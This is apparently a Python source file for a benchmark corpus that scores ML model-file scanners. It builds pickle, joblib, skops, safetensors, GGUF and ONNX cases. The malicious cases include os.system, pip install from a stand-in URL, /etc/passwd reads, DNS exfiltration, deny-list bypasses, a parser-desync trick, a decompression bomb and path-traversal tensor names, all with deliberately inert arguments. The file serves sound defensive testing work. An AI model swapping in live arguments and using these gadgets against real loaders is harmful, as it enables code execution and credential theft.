"""The benchmark corpus: specifications, not payload files.

Nothing in this repository ships a working malicious model file, and that is a
deliberate design constraint rather than an oversight. A git repository full of
ready-to-run pickle RCE payloads is a weapons cache: useful to an attacker who
clones it, hazardous to a contributor who double-clicks one, and likely to be
flagged by the host. So cases are described here as *specifications* and the
bytes are generated into a temporary directory at run time.

Two properties make the generated payloads safe to have on disk:

1. **Inert arguments.** Every payload resolves a genuinely dangerous callable
   (that is the point -- it must exercise the same detection path as a real
   attack) but passes it an argument that does nothing. Commands echo a marker
   string. Hosts and URLs use `.invalid`, the TLD RFC 2606 reserves as
   permanently non-resolvable, so even the DNS-exfiltration cases cannot reach
   a network. A scanner reads the opcode stream and cannot tell the difference;
   a victim who actually loads one prints a marker and exits.

2. **No execution, ever.** Payloads are assembled as raw opcode bytes. This
   module never calls `pickle.loads`, and neither does the runner.

The corpus is only as honest as its provenance, so each case cites where the
technique comes from. Cases invented here, with no published source, are
marked `origin="quickset"` and should be treated as the weakest evidence in
the set: a benchmark whose author also writes the test cases can accidentally
encode one scanner's detection logic as though it were ground truth.
"""

from __future__ import annotations

import io
import json
import pickle
import zipfile
from dataclasses import dataclass, field
from typing import Callable

# Substituted into every payload argument position. Chosen so that a payload
# which somehow does get unpickled is loud and harmless.
MARKER = "QUICKSET-INERT-MARKER"
# RFC 2606 reserves .invalid as never-resolvable. Using it means the network
# cases are structurally identical to the real gadgets while being incapable of
# contacting anything.
INERT_HOST = "marker.quickset.invalid"
INERT_URL = f"http://{INERT_HOST}/marker"


def _su(text: str) -> bytes:
    """SHORT_BINUNICODE push. Payload strings are short by construction."""
    raw = text.encode()
    if len(raw) >= 256:
        raise ValueError("payload string too long for SHORT_BINUNICODE")
    return bytes([0x8C, len(raw)]) + raw


def _reduce(module: str, name: str, packed_args: bytes) -> bytes:
    """Protocol-4 stream: STACK_GLOBAL(module, name), args, REDUCE, STOP."""
    return b"\x80\x04" + _su(module) + _su(name) + b"\x93" + packed_args + b"R."


def _tuple1(inner: bytes) -> bytes:
    return inner + b"\x85"


def legacy_torch_layout(payload: bytes) -> bytes:
    """Wrap `payload` in torch's legacy (non-zip) `_legacy_save` layout.

    torch writes a magic number, a protocol version and a sys_info dict as
    three separate pickles before the real object, then raw tensor storage
    after it. A scanner that stops at the first STOP opcode sees only the
    14-byte magic-number pickle.
    """
    return (
        pickle.dumps(0x1950A86A20F9469CFC6C, protocol=2)
        + pickle.dumps(1001, protocol=2)
        + pickle.dumps({"little_endian": True, "protocol_version": 1001, "type_sizes": {}}, protocol=2)
        + payload
        + b"\x00\x01\x02RAW-TENSOR-STORAGE-PLACEHOLDER\xff"
    )


def _skops_archive(schema: dict) -> bytes:
    """A .skops file: zip of schema.json (+ .npy members for real arrays).

    skops schemas are inert by construction: the loader resolves and
    instantiates the types the schema names, but nothing in a schema passes
    an attacker argument to anything, so a malicious schema is a weaponised
    *type reference*, never a ready-to-run command.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("schema.json", json.dumps(schema))
    return buf.getvalue()


@dataclass(frozen=True)
class Case:
    """One corpus entry.

    `malicious` is the ground truth a scanner is scored against. `filename`
    matters as much as the bytes: several real-world gaps are extension
    dispatch bugs, so a case that must be named `pytorch_model.bin` says so.
    """

    id: str
    filename: str
    malicious: bool
    technique: str
    origin: str
    build: Callable[[], bytes]
    reference: str = ""
    notes: str = ""
    tags: tuple[str, ...] = field(default_factory=tuple)
    known_miss: bool = False
    """True when no scanner in this benchmark is known to detect the case.

    A corpus containing only cases the author's own tool passes is a corpus
    that flatters it. These are carried deliberately so the run can report
    what nobody catches, which is the number this project exists to make
    visible. A case losing this flag because someone fixed it is the best
    outcome the benchmark can produce.
    """



def _safetensors(tensor_name: str) -> bytes:
    """A minimal SafeTensors file whose single tensor carries `tensor_name`.

    The header is assembled by hand rather than through json.dumps, because
    json.dumps escapes precisely the characters these cases are built around:
    a NUL comes back as the six characters `\\u0000` and a CRLF as the four
    characters `\\r\\n`, leaving a case that carries none of what it claims
    and scores as a miss for every scanner. Emitting the raw bytes is also
    what the published proof of concept does, and a header a strict parser
    rejects is the point rather than a defect.
    """
    import struct
    header = (
        b'{"' + tensor_name.encode()
        + b'":{"dtype":"F32","shape":[4],"data_offsets":[0,16]}}'
    )
    return struct.pack("<Q", len(header)) + header + b"\x00" * 16


def _pb_len(field_num: int, raw: bytes) -> bytes:
    """One length-delimited protobuf field, for payloads under 128 bytes."""
    return bytes([(field_num << 3) | 2, len(raw)]) + raw


def _onnx_external_location(location: str) -> bytes:
    """An ONNX-shaped protobuf whose external_data location is `location`.

    Only the fields the check reads are present. A full ONNX graph would add
    bytes without adding signal, and every scanner here dispatches on the
    protobuf structure rather than on a valid graph.
    """
    entry = _pb_len(1, b"location") + _pb_len(2, location.encode())
    tensor = _pb_len(8, entry) + bytes([(9 << 3) | 0, 2])
    return _pb_len(1, _pb_len(12, tensor)) + b"\x08\x07"


def _gguf_tensor_named(tensor_name: str) -> bytes:
    """A GGUF header declaring one tensor with the given name."""
    import struct
    raw = tensor_name.encode()
    out = b"GGUF" + struct.pack("<IQQ", 3, 1, 0)
    out += struct.pack("<Q", len(raw)) + raw
    out += struct.pack("<I", 1) + struct.pack("<Q", 4)
    out += struct.pack("<I", 0) + struct.pack("<Q", 0)
    return out + b"\x00" * ((32 - len(out) % 32) % 32) + b"\x00" * 16


def _nested_pickle_literal() -> bytes:
    """An outer pickle carrying an inner pickle as a bytes literal.

    numpy.load(BytesIO(<pickle>)) is the published shape: the outer callable
    is on no deny list, the outer arguments hold no URL or shell string, and
    the payload exists only once the inner bytes are themselves unpickled.
    """
    inner = _reduce("os", "system", _tuple1(_su(f"echo {MARKER}")))
    return pickle.dumps({"weights": inner})


def _compressed_joblib(codec: str) -> bytes:
    """A joblib payload behind one of the codecs joblib.dump can write."""
    import bz2
    import gzip
    import lzma
    import zlib
    blob = _reduce("os", "system", _tuple1(_su(f"echo {MARKER}")))
    if codec == "gzip":
        return gzip.compress(blob)
    if codec == "bz2":
        return bz2.compress(blob)
    if codec == "xz":
        return lzma.compress(blob, format=lzma.FORMAT_XZ)
    if codec == "lzma":
        return lzma.compress(blob, format=lzma.FORMAT_ALONE)
    return zlib.compress(blob)


def _numpy_hidden_payload() -> bytes:
    """A pickle whose payload sits after raw ndarray bytes in the stream.

    joblib splices raw array data into the opcode stream, so a walker that
    stops at the first unparseable byte never reaches what follows.
    """
    import struct
    import zlib
    head = pickle.dumps({"description": "weights follow"})
    filler = b"\x00\x01\x02\x03" * 2048
    tail = _reduce("os", "system", _tuple1(_su(f"echo {MARKER}")))
    return zlib.compress(head + struct.pack("<I", len(filler)) + filler + tail)


# ── Malicious cases ─────────────────────────────────────────────────

MALICIOUS: tuple[Case, ...] = (
    Case(
        id="direct-os-system",
        filename="direct_os_system.pkl",
        malicious=True,
        technique="Direct reference to a canonical dangerous callable.",
        origin="folklore",
        reference="The baseline every pickle scanner has handled since 2018.",
        notes="Control case. A scanner that misses this is broken, not evaded.",
        tags=("baseline",),
        build=lambda: _reduce("os", "system", _tuple1(_su(f"echo {MARKER}"))),
    ),
    Case(
        id="cve-2025-71350-collect-env",
        filename="collect_env_run.pkl",
        malicious=True,
        technique="torch.utils.collect_env.run, a subprocess wrapper reachable "
                  "from inside the torch namespace itself.",
        origin="published-cve",
        reference="CVE-2025-71350",
        tags=("deny-list-bypass", "torch"),
        build=lambda: _reduce(
            "torch.utils.collect_env", "run", _tuple1(_su(f"echo {MARKER} | cat")),
        ),
    ),
    Case(
        id="cve-2025-1716-pip-main",
        filename="pip_main.pkl",
        malicious=True,
        technique="pip.main installs an attacker-controlled package from an "
                  "attacker-controlled index at load time.",
        origin="published-cve",
        reference="CVE-2025-1716",
        tags=("deny-list-bypass", "supply-chain"),
        build=lambda: _reduce(
            "pip", "main",
            _tuple1(
                b"]("
                + _su("install")
                + _su("--index-url")
                + _su(INERT_URL)
                + _su("marker-package")
                + b"e"
            ),
        ),
    ),
    Case(
        id="cve-2025-46417-linecache-read",
        filename="linecache_getline.pkl",
        malicious=True,
        technique="linecache reads an arbitrary file: the first stage of a "
                  "read-then-exfiltrate chain.",
        origin="published-cve",
        reference="CVE-2025-46417",
        notes="File read only. Scanners that rate this below the exfil half "
              "are not necessarily wrong.",
        tags=("deny-list-bypass", "file-read"),
        build=lambda: _reduce("linecache", "getline", _su("/etc/passwd") + b"K\x01\x86"),
    ),
    Case(
        id="cve-2025-46417-ssl-exfil",
        filename="ssl_exfil.pkl",
        malicious=True,
        technique="ssl.get_server_certificate takes a (host, port) pair, so the "
                  "hostname itself is an outbound DNS channel.",
        origin="published-cve",
        reference="CVE-2025-46417",
        tags=("deny-list-bypass", "exfiltration"),
        build=lambda: _reduce(
            "ssl", "get_server_certificate",
            _tuple1(_su(INERT_HOST) + b"M\xbb\x01" + b"\x86"),
        ),
    ),
    Case(
        id="attrgetter-chain",
        filename="operator_attrgetter.pkl",
        malicious=True,
        technique="operator.attrgetter('system') resolves the dangerous "
                  "callable dynamically, so the denied name never appears in "
                  "the opcode stream for a deny list to match.",
        origin="published-technique",
        reference="Standard pickle gadget-chain primitive; see Trail of Bits' "
                  "fickling and the sleepy-pickle write-ups.",
        tags=("deny-list-bypass", "dynamic-resolution"),
        build=lambda: _reduce("operator", "attrgetter", _tuple1(_su("system"))),
    ),
    Case(
        id="getattr-chain",
        filename="builtins_getattr.pkl",
        malicious=True,
        technique="builtins.getattr(module, 'system') -- the same dynamic "
                  "resolution via a different primitive.",
        origin="published-technique",
        reference="Standard pickle gadget-chain primitive.",
        tags=("deny-list-bypass", "dynamic-resolution"),
        build=lambda: (
            b"\x80\x04"
            + _su("builtins") + _su("getattr") + b"\x93"
            + _su("os") + _su("path") + b"\x93"
            + _su("system")
            + b"\x86"
            + b"R."
        ),
    ),
    Case(
        id="cloudpickle-make-function",
        filename="cloudpickle_make_function.pkl",
        malicious=True,
        technique="cloudpickle._make_function rebuilds a live function from a "
                  "marshalled code object.",
        origin="published-technique",
        reference="Carried in picklescan's _unsafe_globals; cloudpickle "
                  "function reconstruction is a long-documented pickle "
                  "code-execution path.",
        notes="The case that argues against pure argument-evidence scoring. "
              "The payload argument is marshalled bytecode, not a command or "
              "a URL, so no argument heuristic can fire on it -- only the "
              "callable's name identifies this one. A scanner whose entire "
              "strategy is 'look at what the call is passed' misses it.",
        tags=("deny-list-only", "code-object"),
        build=lambda: _reduce(
            "cloudpickle.cloudpickle", "_make_function",
            b")",  # EMPTY_TUPLE: no resolvable literal argument at all
        ),
    ),
    Case(
        id="stack-desync-ext1-pop",
        filename="stack_desync.pkl",
        malicious=True,
        technique="EXT1 followed by POP. The real VM pushes the extension-"
                  "registry object and pops it again, leaving the stack "
                  "unchanged. A scanner that simulates the stack but does not "
                  "model EXT1's push pops the callable instead, desyncing "
                  "every opcode that follows.",
        origin="quickset",
        reference="Found by auditing a scanner's opcode coverage against "
                  "pickletools' 68-opcode table; reported against Hayward, "
                  "which lost the resolved call before 2026-08. The same "
                  "three-byte shape applies to EXT2/EXT4, PERSID/BINPERSID "
                  "and protocol-5 NEXT_BUFFER.",
        notes="Scores stack-simulation fidelity, not callable recognition. "
              "Scanners that only pattern-match imports are unaffected; ones "
              "that reason about call arguments are exactly the ones at risk, "
              "so this case gets more relevant as scanners get smarter.",
        tags=("parser-coverage", "stack-desync"),
        build=lambda: (
            b"\x80\x04"
            + _su("pip") + _su("main") + b"\x93"
            + b"\x82\x01"   # EXT1, code 1 -- pushes one value
            + b"0"          # POP -- real VM removes it; a naive walk removes the callable
            + _su(INERT_URL)
            + b"\x85"
            + b"R."
        ),
    ),
    Case(
        id="dup-amplification-billion-laughs",
        filename="dup_amplification.pkl",
        malicious=True,
        technique="DUP pushes a second reference to the same object, so "
                  "`DUP TUPLE2` costs two bytes and doubles the node count a "
                  "tree-shaped traversal would walk. Repeated, it is a "
                  "billion-laughs bomb aimed at the scanner rather than the "
                  "loader.",
        origin="published-technique",
        reference="Shipped as billionLaughs.pt with ColdwaterQ's DEFCON 30 "
                  "talk 'Backdooring Pickles: A decade only made things "
                  "worse' (github.com/coldwaterq/pickle_injector).",
        notes="Scores resistance to scanner-directed resource exhaustion, "
              "which is a detection property and not merely a performance "
              "one: a scan that stalls or gets OOM-killed reports nothing. "
              "The payload also carries a real os.system, so a scanner that "
              "survives the amplification should still flag the file. "
              "Amplification is kept modest (2^24 logical nodes from ~70 "
              "bytes) so a vulnerable scanner degrades visibly instead of "
              "hanging the whole run.",
        tags=("resource-exhaustion", "scanner-dos"),
        build=lambda: (
            b"\x80\x04"
            + _su("os") + _su("system") + b"\x93"
            + _su(f"echo {MARKER}") + b"\x85"
            + (b"2" + b"\x86") * 24      # DUP + TUPLE2, 24 rounds
            + b"\x85"
            + b"R."
        ),
    ),
    Case(
        id="getattr-through-opaque-argument",
        filename="getattr_globals_eval.pkl",
        malicious=True,
        technique="getattr(globals(), 'eval'). The first argument is the "
                  "result of another call and so is opaque to any static "
                  "walk, which is what makes this harder than a plain "
                  "attrgetter('eval'): a scanner that requires every argument "
                  "to resolve before it will look at any of them discards the "
                  "'eval' literal entirely.",
        origin="published-technique",
        reference="Marco Slaviero, 'Sour Pickles', BlackHat USA 2011 -- the "
                  "memo-register chaining of getattr/apply/globals. Reported "
                  "against Hayward as DEF-45.",
        notes="Protocol 0, hand-assembled. The single-argument variant "
              "attrgetter('eval') is a much easier case and most scanners "
              "catch it; this one specifically scores whether partial "
              "argument resolution is handled.",
        tags=("deny-list-bypass", "dynamic-resolution", "partial-resolution"),
        build=lambda: (
            b"c__builtin__\ngetattr\n"
            b"("                          # MARK for getattr's arguments
            b"c__builtin__\nglobals\n"
            b"(t"                         # MARK + TUPLE -> ()
            b"R"                          # globals() -> opaque
            b"S'eval'\n"
            b"t"                          # TUPLE -> (<opaque>, 'eval')
            b"R"                          # getattr(<opaque>, 'eval')
            b"."
        ),
    ),
    Case(
        id="legacy-layout-second-pickle",
        filename="legacy_layout.pt",
        malicious=True,
        technique="os.system placed in the state_dict position of torch's "
                  "legacy multi-pickle save format. A scanner that stops at "
                  "the first STOP opcode inspects a 14-byte magic number and "
                  "declares the file clean.",
        origin="quickset",
        reference="Found while building this corpus; reported against "
                  "Hayward, which missed it before 2026-08.",
        notes="Not a deny-list bypass -- the payload is the most obvious "
              "gadget there is. It is a *parser coverage* bypass, which is a "
              "distinct failure mode worth scoring separately.",
        tags=("parser-coverage", "torch-legacy"),
        build=lambda: legacy_torch_layout(
            _reduce("os", "system", _tuple1(_su(f"echo {MARKER}")))
        ),
    ),
    Case(
        id="bin-extension-dispatch",
        filename="pytorch_model.bin",
        malicious=True,
        technique="The same direct os.system payload, named pytorch_model.bin "
                  "-- the most common pickle-bearing filename on HuggingFace.",
        origin="quickset",
        reference="Found while building this corpus; Hayward skipped .bin "
                  "on extension before 2026-08.",
        notes="Scores extension dispatch, not opcode analysis. A scanner that "
              "sniffs content passes trivially; one that trusts the extension "
              "never reads the file.",
        tags=("parser-coverage", "extension-dispatch"),
        build=lambda: _reduce("os", "system", _tuple1(_su(f"echo {MARKER}"))),
    ),
    Case(
        id="skops-denied-type-reference",
        filename="model.skops",
        malicious=True,
        technique="skops schema whose ObjectNode names posix.system. skops "
                  "resolves every __module__/__class__ pair it is asked to "
                  "trust, so a type reference is the format's code-execution "
                  "surface -- the same semantics as a pickle GLOBAL.",
        origin="quickset",
        reference="Format contract from skops.io's own loader: load() with "
                  "trusted= instantiates whatever the schema names.",
        notes="Inert like every skops schema: nothing passes an argument, "
              "the danger is the resolved type itself.",
        tags=("skops", "type-reference"),
        build=lambda: _skops_archive({
            "__class__": "system", "__module__": "posix",
            "__loader__": "ObjectNode", "content": {},
        }),
    ),
    Case(
        id="skops-methodnode-inconsistent",
        filename="model.skops",
        malicious=True,
        technique="MethodNode declaring a benign sklearn type while binding "
                  "an attacker type. skops < 0.12.0 trusted the outer "
                  "__module__/__class__ and called the inner object's method.",
        origin="published-cve",
        reference="CVE-2025-54413 (fixed in skops 0.12.0).",
        notes="Both types are off every deny list on purpose: only the "
              "structural inconsistency between the declared and bound type "
              "is detectable, so this scores that mechanism in isolation.",
        tags=("skops", "structural"),
        build=lambda: _skops_archive({
            "__class__": "Pipeline", "__module__": "sklearn.pipeline",
            "__loader__": "MethodNode",
            "content": {
                "obj": {
                    "__class__": "Evil", "__module__": "__main__",
                    "__loader__": "ObjectNode", "content": {},
                },
                "func": "run",
            },
        }),
    ),
    # ── Shapes taken from published bypass corpora ──────────────────
    #
    # Four repositories on the HuggingFace Hub ship proof-of-concept payloads
    # aimed at model scanners. The shapes are reproduced here rather than the
    # files vendored: a hub repository can be deleted, and this corpus stores
    # nothing malicious by design.
    Case(
        id="safetensors-name-traversal",
        filename="model.safetensors",
        malicious=True,
        technique="Tensor name is a relative path escaping the model directory.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc",
        notes="A tensor name looks inert until tooling writes it to a file, "
              "which shard converters and save_pretrained round trips do.",
        tags=("path-traversal", "safetensors"),
        build=lambda: _safetensors("../../../tmp/pwned"),
    ),
    Case(
        id="safetensors-name-nul",
        filename="model.safetensors",
        malicious=True,
        technique="Tensor name carries an embedded NUL ahead of a path.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc",
        notes="Truncation at the NUL is what makes the rest of the name land "
              "somewhere the validator never looked.",
        tags=("path-traversal", "safetensors"),
        build=lambda: _safetensors("weight\x00../../etc/passwd"),
    ),
    Case(
        id="safetensors-name-crlf",
        filename="model.safetensors",
        malicious=True,
        technique="Tensor name carries a newline, forging a record boundary.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc",
        tags=("injection", "safetensors"),
        build=lambda: _safetensors("weight\r\nX-Injected: true"),
    ),
    Case(
        id="gguf-tensor-name-traversal",
        filename="model.gguf",
        malicious=True,
        technique="GGUF tensor name is a relative path escaping the directory.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc",
        tags=("path-traversal", "gguf"),
        build=lambda: _gguf_tensor_named("../../../etc/passwd"),
    ),
    Case(
        id="onnx-external-data-ssrf",
        filename="model.onnx",
        malicious=True,
        technique="external_data location is a URL, so loading the model "
                  "fetches it.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc",
        notes="The published payload points at 169.254.169.254, the cloud "
              "instance metadata endpoint, so a load lifts credentials. That "
              "address is NOT reproduced here: the whole premise of this "
              "corpus is that a scanner may resolve or fetch what a payload "
              "names, and pointing one at a live link-local endpoint from a "
              "CI runner is the one thing every other case is built to avoid. "
              "The path shape is what a scanner matches on, so an .invalid "
              "host measures the same rule.",
        tags=("ssrf", "onnx"),
        build=lambda: _onnx_external_location(
            f"{INERT_URL}/latest/meta-data/"),
    ),
    Case(
        id="onnx-external-data-traversal",
        filename="model.onnx",
        malicious=True,
        technique="external_data location escapes the model directory.",
        origin="hub-bypass-poc",
        reference="ScanMe/test-models",
        tags=("path-traversal", "onnx"),
        build=lambda: _onnx_external_location("../../../../etc/passwd"),
    ),
    Case(
        id="nested-pickle-literal",
        filename="model.pkl",
        malicious=True,
        technique="A second pickle stream carried as a bytes literal.",
        origin="hub-bypass-poc",
        reference="ScanMe/test-models (numpy_load.pkl)",
        notes="numpy.load(BytesIO(<pickle>)) is the shape. The outer callable "
              "is on no deny list and the outer arguments hold no URL or "
              "shell string, so name-based and argument-based checks both "
              "pass. The payload exists only one level down.",
        tags=("deny-list-bypass", "nested"),
        build=_nested_pickle_literal,
    ),
    Case(
        id="joblib-lzma-payload",
        filename="model.joblib",
        malicious=True,
        technique="joblib payload behind lzma rather than zlib.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc (payload2_lzma_rce)",
        notes="joblib.dump accepts zlib, gzip, bz2, lzma and xz. A scanner "
              "sniffing only zlib hands the pickle walker a compressed blob, "
              "finds no opcodes, and reports clean.",
        tags=("compression", "joblib"),
        build=lambda: _compressed_joblib("lzma"),
    ),
    Case(
        id="joblib-bz2-payload",
        filename="model.joblib",
        malicious=True,
        technique="joblib payload behind bz2.",
        origin="derived",
        reference="Same class as the published lzma proof of concept.",
        tags=("compression", "joblib"),
        build=lambda: _compressed_joblib("bz2"),
    ),
    Case(
        id="joblib-xz-payload",
        filename="model.joblib",
        malicious=True,
        technique="joblib payload behind xz.",
        origin="derived",
        reference="Same class as the published lzma proof of concept.",
        tags=("compression", "joblib"),
        build=lambda: _compressed_joblib("xz"),
    ),
    Case(
        id="joblib-payload-after-raw-array",
        filename="model.joblib",
        malicious=True,
        technique="Payload sits after raw ndarray bytes in the pickle stream.",
        origin="hub-bypass-poc",
        reference="vellaveto/joblib-scanner-bypass-poc (payload3_hidden_in_numpy)",
        notes="joblib splices raw array data into the opcode stream, so a "
              "walker that stops at the first unparseable byte never reaches "
              "what follows. Carried as a known miss when it was added; "
              "modelaudit flags it at its critical tier as of 2026-08-06, so "
              "the flag is cleared. It stays in the corpus because the other "
              "three scanners still miss it.",
        tags=("resync", "joblib"),
        build=_numpy_hidden_payload,
    ),
)


# ── Benign cases ────────────────────────────────────────────────────
#
# Half the benchmark, and the half a detection-only corpus silently omits. A
# scanner that flags everything scores perfect recall. These are the ordinary
# shapes that a real model file contains and that must stay quiet.

def _benign_state_dict() -> bytes:
    import collections
    return pickle.dumps(
        collections.OrderedDict([("layer.weight", [0.1, 0.2]), ("layer.bias", [0.0])]),
        protocol=4,
    )


def _benign_stdlib_types() -> bytes:
    import datetime
    import decimal
    import fractions
    import uuid
    return pickle.dumps(
        {
            "trained_at": datetime.datetime(2026, 8, 2, 12, 30),
            "lr": decimal.Decimal("0.001"),
            "run_id": uuid.UUID("12345678-1234-5678-1234-567812345678"),
            "ratio": fractions.Fraction(3, 7),
        },
        protocol=4,
    )


def _benign_custom_class() -> bytes:
    # A user's own class: an unrecognized global on nobody's allow list, and
    # the single most common cause of false positives in this whole space.
    return (
        b"\x80\x04"
        + _su("mypackage.models") + _su("TransformerConfig") + b"\x93"
        + b")"      # EMPTY_TUPLE
        + b"\x81"   # NEWOBJ
        + b"."
    )


def _benign_paths_and_urls() -> bytes:
    # Model metadata legitimately contains paths and URLs. Argument-evidence
    # scanners key on exactly these, so this is their hardest negative.
    return pickle.dumps(
        {
            "checkpoint": "/home/user/models/checkpoint-1200.bin",
            "base_model": "https://huggingface.co/gpt2/resolve/main/config.json",
            "cache": "~/.cache/huggingface",
        },
        protocol=4,
    )



# ── Hard benign negatives ───────────────────────────────────────────
#
# Every builder below targets one specific signal in a real scanner, and
# every one of them is legitimate. A tool that flags these is not being
# thorough, it is being wrong, and the false-positive column is where that
# shows up. Written against this project's own checks on purpose: the
# author's tool is the one whose blind spots the author knows.


def _benign_slashed_tensor_names() -> bytes:
    """Tensor names containing slashes and dots, which are ordinary.

    Traversal checks that split on "/" have to distinguish a path segment
    from a name that merely contains separators. TensorFlow and Keras export
    names exactly like this.
    """
    import struct
    names = [
        "model.layers.0/attention/q_proj.weight",
        "encoder/block_0/layer_norm/gamma:0",
        "dense_1/kernel",
    ]
    header, offset = {}, 0
    for name in names:
        header[name] = {"dtype": "F32", "shape": [4], "data_offsets": [offset, offset + 16]}
        offset += 16
    raw = json.dumps(header).encode()
    return struct.pack("<Q", len(raw)) + raw + b"\x00" * offset


def _benign_adjacent_offsets() -> bytes:
    """Tensors whose spans touch exactly. Legal, and one off from overlapping."""
    import struct
    header = {
        "w1": {"dtype": "F32", "shape": [4], "data_offsets": [0, 16]},
        "w2": {"dtype": "F32", "shape": [4], "data_offsets": [16, 32]},
    }
    raw = json.dumps(header).encode()
    return struct.pack("<Q", len(raw)) + raw + b"\x00" * 32


def _benign_onnx_sibling_weights() -> bytes:
    """external_data naming a real sibling file, which is its whole purpose."""
    entry = _pb_len(1, b"location") + _pb_len(2, b"model-00001-of-00002.bin")
    tensor = _pb_len(8, entry) + bytes([(9 << 3) | 0, 2])
    return _pb_len(1, _pb_len(12, tensor)) + b"\x08\x07"


def _gguf_with_kv(entries: list[tuple[str, str]]) -> bytes:
    """A GGUF file carrying string metadata, and nothing else."""
    import struct

    def gstr(text: str) -> bytes:
        raw = text.encode()
        return struct.pack("<Q", len(raw)) + raw

    out = b"GGUF" + struct.pack("<IQQ", 3, 0, len(entries))
    for key, value in entries:
        out += gstr(key) + struct.pack("<I", 8) + gstr(value)
    return out


def _benign_jinja_chat_template() -> bytes:
    """A chat template of the shape every instruction-tuned model ships.

    Templates are dense with Jinja control flow. A check keying on "{{" alone
    measures how many models are chat-tuned, not how many are malicious.
    """
    template = (
        "{% for message in messages %}"
        "{% if message['role'] == 'user' %}"
        "{{ '<|user|>\\n' + message['content'] + eos_token }}"
        "{% elif message['role'] == 'system' %}"
        "{{ '<|system|>\\n' + message['content'] + eos_token }}"
        "{% endif %}{% endfor %}"
        "{% if add_generation_prompt %}{{ '<|assistant|>' }}{% endif %}"
    )
    return _gguf_with_kv([
        ("general.architecture", "llama"),
        ("tokenizer.chat_template", template),
    ])


def _benign_code_trained_vocab() -> bytes:
    """Tokenizer vocabulary from a code-trained model.

    A vocabulary built from source text necessarily contains "exec(",
    "subprocess" and "__import__". This exact shape produced false positives
    on real unsloth models twice, on two different metadata keys.
    """
    return _gguf_with_kv([
        ("general.architecture", "llama"),
        ("tokenizer.ggml.tokens", "exec( subprocess __import__ os.system eval("),
        ("tokenizer.ggml.merges", "sub process ex ec im port os .system"),
    ])


def _benign_compressed_joblib() -> bytes:
    """An ordinary sklearn-shaped payload behind xz.

    Reading compressed joblib is necessary; treating compression itself as a
    signal is not. joblib.dump(compress=...) is a documented, common option.
    """
    import lzma
    payload = pickle.dumps(
        {"coef_": [0.1, 0.2, 0.3], "intercept_": 0.4, "n_features_in_": 3},
        protocol=4,
    )
    return lzma.compress(payload, format=lzma.FORMAT_XZ)


def _benign_bytes_that_start_like_a_pickle() -> bytes:
    """A weights blob whose first bytes happen to match a PROTO marker.

    Any check that treats an embedded bytes literal as a nested pickle has to
    survive tensor data that begins 0x80 0x04 by coincidence, which in a large
    model is a matter of time rather than luck.
    """
    return pickle.dumps(
        {"weights": b"\x80\x04" + bytes(range(256)) * 32, "name": "resnet50"},
        protocol=4,
    )


def _benign_pickle_after_raw_bytes() -> bytes:
    """Two pickles separated by raw array data, as joblib writes them.

    A walk that resyncs past raw bytes must not invent findings in the
    ordinary case, which is every joblib file ever written.
    """
    import struct
    head = pickle.dumps({"description": "weights follow"}, protocol=4)
    array = struct.pack("<1024f", *[0.5] * 1024)
    tail = pickle.dumps({"shape": [32, 32], "dtype": "float32"}, protocol=4)
    return head + array + tail


BENIGN: tuple[Case, ...] = (
    Case(
        id="benign-state-dict",
        filename="benign_state_dict.pkl",
        malicious=False,
        technique="An ordinary OrderedDict state_dict.",
        origin="quickset",
        tags=("baseline",),
        build=_benign_state_dict,
    ),
    Case(
        id="benign-stdlib-types",
        filename="benign_stdlib_types.pkl",
        malicious=False,
        technique="datetime, Decimal, UUID and Fraction: unrecognized stdlib "
                  "globals that ordinary pickles construct constantly.",
        origin="quickset",
        notes="Targets the tempting-but-wrong heuristic 'the stdlib is where "
              "gadgets live, so flag unrecognized stdlib globals'. The stdlib "
              "is also where the ordinary data types live.",
        tags=("false-positive-bait",),
        build=_benign_stdlib_types,
    ),
    Case(
        id="benign-custom-class",
        filename="benign_custom_class.pkl",
        malicious=False,
        technique="A user-defined class, on neither the allow nor the deny "
                  "list, constructed via NEWOBJ.",
        origin="quickset",
        notes="Targets 'escalate any unknown global that is actually invoked'. "
              "A benign custom class is invoked exactly like a gadget is.",
        tags=("false-positive-bait",),
        build=_benign_custom_class,
    ),
    Case(
        id="benign-paths-and-urls",
        filename="benign_paths_and_urls.pkl",
        malicious=False,
        technique="Filesystem paths and an https URL as ordinary metadata "
                  "strings, not as arguments to a dangerous callable.",
        origin="quickset",
        notes="Targets naive argument-content matching.",
        tags=("false-positive-bait",),
        build=_benign_paths_and_urls,
    ),
    # ── Hard negatives, each aimed at one real detection signal ─────
    Case(
        id="benign-slashed-tensor-names",
        filename="model.safetensors",
        malicious=False,
        technique="Tensor names containing slashes and dots, as TensorFlow "
                  "and Keras exports produce.",
        origin="quickset",
        notes="Targets traversal checks on tensor names. A name is not a "
              "path merely because it contains separators, and the "
              "distinction is the whole rule.",
        tags=("false-positive-bait", "safetensors"),
        build=_benign_slashed_tensor_names,
    ),
    Case(
        id="benign-adjacent-offsets",
        filename="model.safetensors",
        malicious=False,
        technique="Two tensors whose data spans touch exactly.",
        origin="quickset",
        notes="Targets overlap detection at its boundary: end == start is "
              "legal and is what a packed file looks like. One byte the "
              "other way is a real finding.",
        tags=("false-positive-bait", "safetensors"),
        build=_benign_adjacent_offsets,
    ),
    Case(
        id="benign-onnx-sibling-weights",
        filename="model.onnx",
        malicious=False,
        technique="external_data naming a sharded sibling file.",
        origin="quickset",
        notes="Targets external_data checks. Pointing at a neighbouring "
              "weights file is the feature, not an abuse of it.",
        tags=("false-positive-bait", "onnx"),
        build=_benign_onnx_sibling_weights,
    ),
    Case(
        id="benign-jinja-chat-template",
        filename="model.gguf",
        malicious=False,
        technique="A chat template with the Jinja control flow every "
                  "instruction-tuned model ships.",
        origin="quickset",
        notes="Targets template-injection checks that key on '{{'. Matching "
              "that counts chat-tuned models, not malicious ones.",
        tags=("false-positive-bait", "gguf"),
        build=_benign_jinja_chat_template,
    ),
    Case(
        id="benign-code-trained-vocab",
        filename="model.gguf",
        malicious=False,
        technique="Tokenizer vocabulary containing exec(, subprocess and "
                  "__import__ as ordinary tokens.",
        origin="hub-observed",
        reference="unsloth GGUF releases",
        notes="Not hypothetical. This shape produced false positives on real "
